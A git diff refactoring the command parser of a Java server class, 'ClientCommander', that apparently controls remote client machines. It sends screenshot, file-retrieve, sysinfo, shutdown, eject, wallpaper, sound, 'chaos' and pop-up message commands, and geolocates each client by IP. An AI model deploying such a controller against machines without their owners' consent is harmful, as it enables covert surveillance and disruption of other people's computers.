@@ -136,149 +136,199 @@ public class ClientCommander implements Runnable
     }
 
     /**
+     * calls the correct method according to argument provided. This is used for commands with no arguments, e.g. count, online, help
+     * @param cmd the no argument command to be processed
+     */
+    private void processZeroArgCommand(String cmd)
+    {
+        switch(cmd)
+        {
+            case CMD_ONLINE:
+                printOnlineClients();
+                break;
+            case CMD_COUNT:
+                printOnlineCount();
+                break;
+            case CMD_HELP:
+                printHelp(null);
+                break;
+            default:
+        }
+    }
+
+    private ConnectedClient getClientFromIPAddress(String ipAddress) throws UnknownHostException
+    {
+        return connectedClients.get(InetAddress.getByName(ipAddress));
+    }
+
+    /**
+     * processes one argument commands, e.g. sysinfo, retrieve, screenshot, eject, shutdown, restart, help
+     * @param cmd the command itself, e.g. count
+     * @param arg argument for the command
+     * @throws UnknownHostException if the supplied IP address doesn't match any online clients
+     * @throws IOException if something went wrong printing os info via sysinfo
+     */
+    private void processOneArgCommand(String cmd, String arg) throws UnknownHostException, IOException
+    {
+        if(cmd.equals(CMD_HELP))
+        {
+            printHelp(arg);
+            return;
+        }
+
+        ConnectedClient target = null;
+        if(arg.equals(HOST_ALL))
+            sendCommandAll(cmd);
+        else // otherwise get specified client
+            target = getClientFromIPAddress(arg);
+
+        if(target != null)
+        {
+            target.sendCommandPart(cmd);
+            if(cmd.equals(CMD_SYSINFO))
+                target.printClientOSInfo();
+            else if(cmd.equals(CMD_RETRIEVE))
+                target.retrieve();
+        }
+    }
+
+    /**
+     * processes two argument commands, e.g. wallpaper, sound, type, rotate
+     * @param cmd the command itself, e.g. sound
+     * @param host the IP address of the host to perform the command on, or all
+     * @param arg an argument for the command
+     * @throws UnknownHostException if the client couldn't be found from the supplied IP address
+     * @throws IOException if something went wrong sending the file (if the cmd needed to) to the client
+     */
+    private void processTwoArgCommand(String cmd, String host, String arg) throws UnknownHostException, IOException
+    {
+        ConnectedClient target = null;
+        if(host.equals(HOST_ALL))
+        {
+            sendCommandAll(cmd);
+            File toSend;
+            if(cmd.equals(CMD_SOUND))
+            {
+                toSend = new File(arg);
+                sendFileAll(toSend, (int)toSend.length());
+            }
+            else if(cmd.equals(CMD_WALLPAPER))
+            {
+                toSend = new File(arg);
+                sendFileAll(toSend, (int)toSend.length());
+            }
+            else
+                sendCommandAll(arg);
+        }
+        else
+            target = getClientFromIPAddress(host);
+
+        if(target != null)
+        {
+            target.sendCommandPart(cmd);
+            File toSend;
+            if(cmd.equals(CMD_SOUND))
+            {
+                toSend = new File(arg);
+                target.sendFile(toSend, (int)toSend.length());
+            }
+            else if(cmd.equals(CMD_WALLPAPER))
+            {
+                toSend = new File(arg);
+                target.sendFile(toSend, (int)toSend.length());
+            }
+            else
+                target.sendCommandPart(arg);
+        }
+    }
+
+    /**
+     * processes three argument commands, e.g. chaos
+     * @param cmd the command itself, e.g. chaos
+     * @param host the IP address of the host or all
+     * @param arg1 the argument for the command
+     * @param arg2 another argument for the command
+     * @throws UnknownHostException if the host could not be found from the supplied IP address
+     */
+    private void processThreeArgCommand(String cmd, String host, String arg1, String arg2) throws UnknownHostException
+    {
+        ConnectedClient target = null;
+        if(host.equals(HOST_ALL))
+        {
+            sendCommandAll(cmd);
+            sendCommandAll(arg1);
+            sendCommandAll(arg2);
+        }
+        else
+        {
+            target = getClientFromIPAddress(host);
+            target.sendCommandPart(cmd);
+            target.sendCommandPart(arg1);
+            target.sendCommandPart(arg2);
+        }
+    }
+
+    /**
+     * processes four argument commands, e.g. msg
+     * @param cmd command itself, e.g. msg
+     * @param host the host IP address or all
+     * @param arg1 arg for the command
+     * @param arg2 arg for the command
+     * @param arg3 arg for the command
+     * @throws UnknownHostException if the provided IP address doesn't match any online clients
+     */
+    private void processFourArgCommand(String cmd, String host, String arg1, String arg2, String arg3) throws UnknownHostException
+    {
+        ConnectedClient target = null;
+        if(host.equals(HOST_ALL))
+        {
+            sendCommandAll(cmd);
+            sendCommandAll(arg1);
+            sendCommandAll(arg2);
+            sendCommandAll(arg3);
+        }
+        else
+        {
+            target = getClientFromIPAddress(host);
+            target.sendCommandPart(cmd);
+            target.sendCommandPart(arg1);
+            target.sendCommandPart(arg2);
+            target.sendCommandPart(arg3);
+        }
+    }
+
+    /**
      * uses the command input by the server user to execute the command on the
      * specified clients
      * @param fullCommand the users command input. Different commands have different args.
-     * @throws UnknownHostException thrown if the host provided is incorrect
      */
-    private void parseAndSendCommand(String fullCommand) throws NullCommandException, IOException
+    private void parseAndSendCommand(String fullCommand)
     {
         ArrayList<String> commandTokens = tokeniseCommand(fullCommand);
         String command = commandTokens.get(0);
 
-        // Zero argument commands: online, count, help
-        // e.g. count
-        if(command.equals(CMD_ONLINE))
+        try
         {
-            printOnlineClients();
-            return;
-        }
-
-        if(command.equals(CMD_COUNT))
-        {
-            printOnlineCount();
-            return;
-        }
-
-        if(command.equals(CMD_HELP))
-        {
-            if(commandTokens.size() == 2)
-                printHelp(commandTokens.get(1));
+            if(commandTokens.size() == 1)
+                processZeroArgCommand(command);
+            else if(commandTokens.size() == 2)
+                processOneArgCommand(command, commandTokens.get(1));
+            else if(commandTokens.size() == 3)
+                processTwoArgCommand(command, commandTokens.get(1), commandTokens.get(2));
+            else if(commandTokens.size() == 4)
+                processThreeArgCommand(command, commandTokens.get(1), commandTokens.get(2), commandTokens.get(3));
+            else if(commandTokens.size() == 5)
+                processFourArgCommand(command, commandTokens.get(1), commandTokens.get(2), commandTokens.get(3), commandTokens.get(4));
             else
-                printHelp(null);
-            return;
+                System.out.println("Unknown command: " + fullCommand);
         }
-
-        // One argument commands: eject, shutdown, reboot, screenshot, retrieve, os
-        // e.g. eject 127.0.0.1
-        String host = null;
-        if(commandTokens.size() > 1)
-            host = commandTokens.get(1);
-        if(host == null)
-            throw new NullCommandException("Host not provided");
-
-        ConnectedClient target = null;
-        if(host.equals(HOST_ALL))
-            sendCommandAll(command);
-        else // find the specified client
-            target = connectedClients.get(InetAddress.getByName(host));
-
-        if(target == null && !host.equals(HOST_ALL))
-            throw new UnknownHostException(host + " isn't online or doesn't exist");
-
-        if(!host.equals(HOST_ALL))
-            target.sendCommandPart(command); // send the cmd to the specified connected client
-
-        if(command.equals(CMD_SYSINFO))
+        catch(UnknownHostException uhe)
         {
-            target.printClientOSInfo();
-            return;
+            System.out.println("Unknown host provided. Try running online to see if the client is online");
         }
-
-        if(command.equals(CMD_RETRIEVE))
+        catch(IOException ioe)
         {
-            target.retrieve();
-            return;
-        }
-
-        // Two argument commands: sound, type, rotate, wallpaper
-        // e.g. sound 127.0.0.1 /path/to/sound/file
-        String argument = null;
-        if(commandTokens.size() == 3)
-        {
-            argument = commandTokens.get(2);
-            if(command.equals(CMD_TYPE))
-            {
-                if(host.equals(HOST_ALL)) // command has already been sent, just need to send argument now
-                    sendCommandAll(argument);
-                else
-                    target.sendCommandPart(argument); // if the client recieves the msg command it knows to read the next line of input (the msg itself)
-            }
-            else if(command.equals(CMD_SOUND)) // special as we need to send the sound file to the client
-            {
-                File sound = new File(argument);
-                int size = (int)sound.length();
-                if(host.equals(HOST_ALL))
-                    sendFileAll(sound, size);
-                else
-                    target.sendFile(sound, size);
-            }
-            else if(command.equals(CMD_ROTATE))
-            {
-                if(host.equals(HOST_ALL))
-                    sendCommandAll(argument);
-                else
-                    target.sendCommandPart(argument);
-            }
-            else if(command.equals(CMD_WALLPAPER))
-            {
-                File wallpaper = new File(argument);
-                if(host.equals(HOST_ALL))
-                    sendFileAll(wallpaper, (int)wallpaper.length());
-                else
-                    target.sendFile(wallpaper, (int)wallpaper.length());
-            }
-        }
-
-        // Three argument commands: chaos
-        // e.g. chaos all 60000 200
-        String length, delay;
-        if(commandTokens.size() == 4)
-        {
-            length = commandTokens.get(2);
-            delay = commandTokens.get(3);
-            if(host.equals(HOST_ALL))
-            {
-                sendCommandAll(length);
-                sendCommandAll(delay);
-            }
-            else
-            {
-                target.sendCommandPart(length);
-                target.sendCommandPart(delay);
-            }
-        }
-
-        // Four argument commands: msg
-        // e.g. msg 127.0.0.1 "message here" "title here" warning
-        String msg, title, type;
-        if(commandTokens.size() == 5)
-        {
-            msg = commandTokens.get(2);
-            title = commandTokens.get(3);
-            type = commandTokens.get(4);
-            if(host.equals(HOST_ALL))
-            {
-                sendCommandAll(msg);
-                sendCommandAll(title);
-                sendCommandAll(type);
-            }
-            else
-            {
-                target.sendCommandPart(msg);
-                target.sendCommandPart(title);
-                target.sendCommandPart(type);
-            }
+            System.err.println("Something went wrong sending files over to the client");
         }
     }
 
@@ -309,14 +359,23 @@ public class ClientCommander implements Runnable
 
     /**
      * prints online client info including their rough location in the world (city & country) and the ISP detected
-     * @throws IOException if the database readers fail to reader the provided database
      */
-    private void printOnlineClients() throws IOException
+    private void printOnlineClients()
     {
         File countryDB = new File("geolocation/GeoLite2-Country.mmdb");
         File cityDB = new File("geolocation/GeoLite2-City.mmdb");
-        DatabaseReader countryReader = new DatabaseReader.Builder(countryDB).build();
-        DatabaseReader cityReader = new DatabaseReader.Builder(cityDB).build();
+        DatabaseReader countryReader = null;
+        DatabaseReader cityReader = null;
+        try
+        {
+            countryReader = new DatabaseReader.Builder(countryDB).build();
+            cityReader = new DatabaseReader.Builder(cityDB).build();
+        }
+        catch(IOException ioe)
+        {
+            System.err.println("Failed create DB readers");
+        }
+
         for(Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
         {
             System.out.print(client.getKey().toString().replace("/", ""));
@@ -327,13 +386,20 @@ public class ClientCommander implements Runnable
                 IspResponse isp = cityReader.isp(client.getKey());
                 System.out.println("\t[ " + city.getCity() + ", " + country.getCountry() + ", " + isp.getIsp() + " ]");
             }
-            catch(GeoIp2Exception geoExcp)
+            catch(NullPointerException | IOException | GeoIp2Exception geoExcp)
             {
                 System.out.println("\t[ UNKNOWN ]");
             }
         }
 
-        countryReader.close();
-        cityReader.close();
+        try
+        {
+            countryReader.close();
+            cityReader.close();
+        }
+        catch(IOException ioe)
+        {
+            System.err.println("Failed to close DB readers");
+        }
     }
 }
